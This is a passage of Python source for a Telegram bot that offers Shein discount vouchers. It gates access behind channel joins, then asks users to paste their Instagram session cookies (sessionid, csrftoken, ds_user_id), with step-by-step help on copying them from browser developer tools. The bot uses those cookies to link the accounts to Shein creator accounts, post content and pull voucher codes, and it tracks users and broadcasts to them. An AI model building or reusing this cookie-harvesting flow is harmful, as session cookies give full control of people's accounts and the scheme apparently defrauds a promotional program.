                f"❌ <b>Connection Failed!</b>\n\n⚠️ Error: {error_msg[:100]}\n\n"
                f"📱 Shein: +91-{shein_account['mobile']}\n\n<i>Try with a different Instagram account.</i>",
                parse_mode=ParseMode.HTML
            )
            return

        ig_info      = connect_result.get('instagram', {})
        ig_username  = ig_info.get('username', 'N/A')
        ig_followers = ig_info.get('followers', 'N/A')
        voucher      = connect_result.get('voucher')

        # Step 7: Fetch voucher if not already in connect response
        if not voucher:
            await progress.edit_text(
                f"🔄 <b>Processing...</b>\n\n[█████████░] 95%\n\n🎫 Fetching Voucher Code...",
                parse_mode=ParseMode.HTML
            )
            voucher = await fetch_voucher(shein_account['creator_token'], max_retries=10)

        if voucher:
            voucher_code  = voucher.get('voucher_code', voucher.get('code', 'N/A'))
            voucher_value = voucher.get('voucher_amount', voucher.get('value', voucher.get('discount', 'N/A')))
            expiry        = voucher.get('expiry_date', 'N/A')
            min_purchase  = voucher.get('min_purchase_amount', voucher.get('minimum_order_amount', voucher.get('min_order', voucher.get('minimum_purchase'))))
            min_line      = f"🛒 <b>Min. Purchase:</b> ₹{min_purchase}\n" if min_purchase is not None else ""
            min_footer    = f"\n📦 <i>Valid on orders above ₹{min_purchase}</i>" if min_purchase is not None else ""
            increment_voucher_count()
            await progress.edit_text(
                f"✨ <b>VOUCHER GENERATED!</b> ✨\n\n"
                f"[██████████] 100% ✅\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎫 <b>Code:</b> <code>{voucher_code}</code>\n"
                f"💰 <b>Value:</b> ₹{voucher_value} OFF\n"
                f"{min_line}"
                f"📅 <b>Expires:</b> {expiry}\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📝 <b>Posts Created:</b> {TOTAL_POSTS}/8 ✅\n"
                f"📱 Shein: +91-{shein_account['mobile']}\n"
                f"📷 Instagram: @{ig_username}\n"
                f"👥 Followers: {ig_followers}\n\n"
                f"💎 <i>Copy code & use on Shein app!</i>"
                f"{min_footer}",
                parse_mode=ParseMode.HTML
            )
        else:
            await progress.edit_text(
                f"⚠️ <b>Almost Done!</b>\n\n[█████████░] 90%\n\n"
                f"✅ Instagram Linked: @{ig_username}\n"
                f"📝 Posts Created: {TOTAL_POSTS}/8 ✅\n"
                f"📱 Shein: +91-{shein_account['mobile']}\n\n"
                f"⏳ <i>Voucher processing. Check Shein app in few minutes.</i>",
                parse_mode=ParseMode.HTML
            )

    except Exception as e:
        logger.error(f"Error in voucher flow: {e}")
        await message.answer(f"❌ Error: {str(e)}")

# ============== BOT HANDLERS ==============

async def main():
    global GLOBAL_IMAGE_PATH

    logger.info("Downloading shared image...")
    GLOBAL_IMAGE_PATH = await download_image(IMAGE_URL)
    if not GLOBAL_IMAGE_PATH:
        logger.warning("Could not download image, continuing without it")

    bot     = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    storage = MemoryStorage()
    dp      = Dispatcher(storage=storage)

    def create_main_keyboard():
        keyboard = ReplyKeyboardBuilder()
        keyboard.button(text="🎫 Generate Voucher")
        keyboard.button(text="ℹ️ Help")
        keyboard.adjust(1)
        return keyboard.as_markup(resize_keyboard=True)

    def create_admin_keyboard():
        keyboard = ReplyKeyboardBuilder()
        keyboard.button(text="📊 Stats")
        keyboard.button(text="📢 Broadcast")
        keyboard.button(text="📈 24hr Report")
        keyboard.button(text="🎫 Generate Voucher")
        keyboard.button(text="ℹ️ Help")
        keyboard.adjust(2, 2, 1)
        return keyboard.as_markup(resize_keyboard=True)

    @dp.message(CommandStart())
    async def start_command(message: Message):
        user_id    = message.from_user.id
        username   = message.from_user.username
        first_name = message.from_user.first_name
        add_user(user_id, username, first_name)
        is_member, status_msg = await verify_membership(bot, user_id)
        if not is_member:
            await message.answer(
                f"🛍 <b>SHEIN VOUCHER BOT</b> 💎\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n⚠️ <b>JOIN REQUIRED!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n\n{status_msg}\n\n👇 <b>Join all channels:</b>",
                reply_markup=create_join_channels_keyboard(), parse_mode=ParseMode.HTML
            )
            return
        if user_id in ADMIN_IDS:
            stats      = load_stats()
            user_stats = get_user_stats()
            await message.answer(
                f"👑 <b>ADMIN PANEL</b> 👑\n\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 <b>Live Statistics</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"👥 Total Users: <b>{user_stats['total_users']}</b>\n"
                f"🆕 Today New: <b>{user_stats['today_new']}</b>\n\n"
                f"🎫 Today Vouchers: <b>{stats.get('today_vouchers', 0)}</b>\n"
                f"🎫 Total Vouchers: <b>{stats.get('total_vouchers', 0)}</b>\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n💎 Use buttons for actions",
                reply_markup=create_admin_keyboard()
            )
            return
        await message.answer(
            "🛍 <b>SHEIN VOUCHER BOT</b> 💎\n\n⚡ Click <b>Generate Voucher</b> to get your ₹500 coupon!",
            reply_markup=create_main_keyboard(), parse_mode=ParseMode.HTML
        )

    @dp.callback_query(F.data == "check_membership")
    async def check_membership_callback(callback: CallbackQuery):
        user_id      = callback.from_user.id
        is_member, _ = await verify_membership(bot, user_id)
        if is_member:
            await callback.message.edit_text(
                "✅ <b>All channels verified!</b>", parse_mode=ParseMode.HTML
            )
            await callback.message.answer(
                "🛍 <b>SHEIN VOUCHER BOT</b> 💎\n\n⚡ Click <b>Generate Voucher</b> to get your ₹500 coupon!",
                reply_markup=create_main_keyboard(), parse_mode=ParseMode.HTML
            )
        else:
            await callback.answer("❌ Not all channels joined!", show_alert=True)

    @dp.message(F.text == "📊 Stats")
    async def admin_stats(message: Message):
        if message.from_user.id not in ADMIN_IDS:
            await message.answer("❌ Admin only command!")
            return
        stats      = load_stats()
        user_stats = get_user_stats()
        users_data = load_users()
        recent_users = [
            f"• {d.get('first_name') or d.get('username') or uid}"
            for uid, d in list(users_data.get('users', {}).items())[-5:]
        ]
        text = (
            f"📊 <b>Bot Statistics</b>\n\n"
            f"👥 <b>Users:</b>\n├ Total: {user_stats['total_users']}\n└ Today New: {user_stats['today_new']}\n\n"
            f"🎫 <b>Vouchers:</b>\n├ Today: {stats.get('today_vouchers', 0)}\n└ Total: {stats.get('total_vouchers', 0)}\n\n"
            f"📅 <b>Last Update:</b> {stats.get('last_reset', 'N/A')}\n\n"
            f"👤 <b>Recent Users:</b>\n" + ("\n".join(recent_users) if recent_users else "No users yet")
        )
        await message.answer(text, reply_markup=create_admin_keyboard())

    @dp.message(F.text == "📢 Broadcast")
    async def admin_broadcast_start(message: Message, state: FSMContext):
        if message.from_user.id not in ADMIN_IDS:
            await message.answer("❌ Admin only command!")
            return
        user_stats = get_user_stats()
        await message.answer(
            f"📢 <b>Broadcast Message</b>\n\nWill be sent to: {user_stats['total_users']} users\n\n"
            f"Send me the message to broadcast.\n<i>Supports HTML formatting.</i>\n\nSend /cancel to cancel.",
            parse_mode=ParseMode.HTML
        )
        await state.set_state(BotStates.waiting_for_broadcast)

    @dp.message(BotStates.waiting_for_broadcast)
    async def process_broadcast(message: Message, state: FSMContext):
        if message.from_user.id not in ADMIN_IDS:
            await state.clear()
            return
        if message.text == "/cancel":
            await state.clear()
            await message.answer("❌ Broadcast cancelled.", reply_markup=create_admin_keyboard())
            return
        await state.clear()
        broadcast_text = message.text or message.caption or ""
        if not broadcast_text:
            await message.answer("❌ Empty message!", reply_markup=create_admin_keyboard())
            return
        progress = await message.answer("📤 Broadcasting...")
        user_ids = get_all_user_ids()
        success = failed = 0
        for uid in user_ids:
            try:
                await bot.send_message(uid, broadcast_text, parse_mode=ParseMode.HTML)
                success += 1
            except Exception as e:
                failed += 1
                logger.error(f"Broadcast to {uid} failed: {e}")
            if success % 25 == 0:
                await asyncio.sleep(1)
        await progress.edit_text(
            f"✅ <b>Broadcast Complete!</b>\n\n📤 Sent: {success}\n❌ Failed: {failed}\n📊 Total: {len(user_ids)}",
            parse_mode=ParseMode.HTML
        )

    @dp.message(F.text == "📈 24hr Report")
    async def admin_report(message: Message):
        if message.from_user.id not in ADMIN_IDS:
            await message.answer("❌ Admin only command!")
            return
        stats      = load_stats()
        user_stats = get_user_stats()
        history    = stats.get('voucher_history', [])
        history_text = "\n".join(f"📅 {e['date']}: {e['count']} vouchers" for e in history[-7:]) or "No history yet"
        await message.answer(
            f"📈 <b>24 Hour Report</b>\n\n📅 <b>Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"👥 <b>Users Today:</b>\n├ New Users: {user_stats['today_new']}\n└ Total Users: {user_stats['total_users']}\n\n"
            f"🎫 <b>Vouchers Today:</b> {stats.get('today_vouchers', 0)}\n"
            f"🎫 <b>Total Vouchers:</b> {stats.get('total_vouchers', 0)}\n\n"
            f"📊 <b>Last 7 Days:</b>\n{history_text}",
            reply_markup=create_admin_keyboard(), parse_mode=ParseMode.HTML
        )

    @dp.message(F.text == "🎫 Generate Voucher")
    async def generate_voucher(message: Message, state: FSMContext):
        user_id       = message.from_user.id
        is_member, status_msg = await verify_membership(bot, user_id)
        if not is_member:
            await message.answer(
                f"⚠️ <b>You must join all channels first!</b>\n\n{status_msg}\n\n👇 <b>Join these channels:</b>",
                reply_markup=create_join_channels_keyboard(), parse_mode=ParseMode.HTML
            )
            return
        await message.answer(
            "🔑 <b>Send your Instagram cookies</b>\n\nRequired cookies:\n"
            "• <code>sessionid</code>\n• <code>csrftoken</code>\n• <code>ds_user_id</code>\n\n"
            "Format: <code>sessionid=xxx; csrftoken=xxx; ds_user_id=xxx</code>\n\n"
            "⚠️ Get fresh cookies from browser (F12 → Application → Cookies)"
        )
        await state.set_state(BotStates.waiting_for_cookies)

    @dp.message(BotStates.waiting_for_cookies)
    async def process_cookies(message: Message, state: FSMContext):
        user_id       = message.from_user.id
        is_member, status_msg = await verify_membership(bot, user_id)
        if not is_member:
            await state.clear()
            await message.answer(
                f"⚠️ <b>You must join all channels first!</b>\n\n{status_msg}",
                reply_markup=create_join_channels_keyboard(), parse_mode=ParseMode.HTML
            )
            return
        await state.clear()
        cookie_string = message.text.strip()
        if 'sessionid' not in cookie_string or 'csrftoken' not in cookie_string:
            await message.answer(
                "❌ Invalid cookie format!\n\nMake sure you include: sessionid, csrftoken, ds_user_id",
                reply_markup=create_main_keyboard()
            )
            return
        await full_voucher_flow(bot, message, cookie_string)

    @dp.message(F.text == "ℹ️ Help")
    async def help_command(message: Message):
        await message.answer(
            "📖 <b>How to get Instagram cookies:</b>\n\n"
            "1. Open Instagram in Chrome\n2. Press F12 (Developer Tools)\n"
            "3. Go to Application → Cookies → instagram.com\n4. Copy these values:\n"
            "   • sessionid\n   • csrftoken\n   • ds_user_id\n\n"
            "5. Format: <code>sessionid=xxx; csrftoken=xxx; ds_user_id=xxx</code>\n\n"
            "⚠️ Make sure cookies are fresh (not expired)"
        )

    @dp.message()
    async def unknown_message(message: Message):
        if message.text and ('sessionid' in message.text.lower() or 'csrftoken' in message.text.lower()):
            user_id       = message.from_user.id
            is_member, status_msg = await verify_membership(bot, user_id)
            if not is_member:
                await message.answer(
                    f"⚠️ <b>You must join all channels first!</b>\n\n{status_msg}",
                    reply_markup=create_join_channels_keyboard(), parse_mode=ParseMode.HTML
                )
                return
            await full_voucher_flow(bot, message, message.text.strip())
        else:
            await message.answer("Use the buttons below or send /start")

    logger.info("🤖 Bot started!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    import warnings
    warnings.filterwarnings("ignore")
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nBot stopped")
    except Exception as e:
        print(f"Fatal error: {e}")
